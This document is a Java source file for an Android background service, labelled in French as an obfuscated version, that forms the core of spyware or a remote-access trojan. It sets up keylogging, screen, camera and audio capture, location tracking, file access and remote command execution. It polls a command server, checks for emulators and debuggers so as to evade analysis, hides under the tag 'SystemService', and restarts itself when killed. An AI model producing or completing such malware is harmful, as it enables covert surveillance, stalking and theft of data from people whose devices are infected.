// MainService.java - Version obfusquée
package com.ghost.core;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainService extends Service {
    
    private static final String TAG = "SystemService";
    private ScheduledExecutorService scheduler;
    
    // Gestionnaires
    private ScreenCapture screenCapture;
    private CameraManager cameraManager;
    private AudioRecorder audioRecorder;
    private KeyLoggerService keyLogger;
    private LocationTracker locationTracker;
    private FileManager fileManager;
    private CommandExecutor commandExecutor;
    private NetworkManager networkManager;
    
    // Anti-détection
    private AntiAnalysis antiAnalysis;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Vérifier l'environnement
        antiAnalysis = new AntiAnalysis(this);
        if (antiAnalysis.isEmulator() || antiAnalysis.isDebugged()) {
            stopSelf();
            return;
        }
        
        // Initialisation
        scheduler = Executors.newScheduledThreadPool(3);
        
        screenCapture = new ScreenCapture(this);
        cameraManager = new CameraManager(this);
        audioRecorder = new AudioRecorder(this);
        keyLogger = new KeyLoggerService(this);
        locationTracker = new LocationTracker(this);
        fileManager = new FileManager(this);
        networkManager = new NetworkManager(this);
        commandExecutor = new CommandExecutor(this);
        
        // Démarrer les tâches périodiques
        startServices();
        
        // Enregistrer l'appareil
        registerDevice();
    }
    
    private void startServices() {
        // Vérifier les commandes toutes les 5 secondes
        scheduler.scheduleAtFixedRate(() -> {
            commandExecutor.checkCommands();
        }, 0, 5, TimeUnit.SECONDS);
        
        // Envoyer la localisation toutes les minutes
        scheduler.scheduleAtFixedRate(() -> {
            locationTracker.sendLocation();
        }, 0, 60, TimeUnit.SECONDS);
        
        // Heartbeat toutes les 30 secondes
        scheduler.scheduleAtFixedRate(() -> {
            networkManager.sendHeartbeat();
        }, 0, 30, TimeUnit.SECONDS);
    }
    
    private void registerDevice() {
        String deviceId = networkManager.getDeviceId();
        String apiKey = getSharedPreferences("config", MODE_PRIVATE)
            .getString("api_key", "");
        
        networkManager.registerDevice(deviceId, apiKey);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (scheduler != null) {
            scheduler.shutdown();
        }
        
        // Redémarrer
        Intent intent = new Intent(this, MainService.class);
        startService(intent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
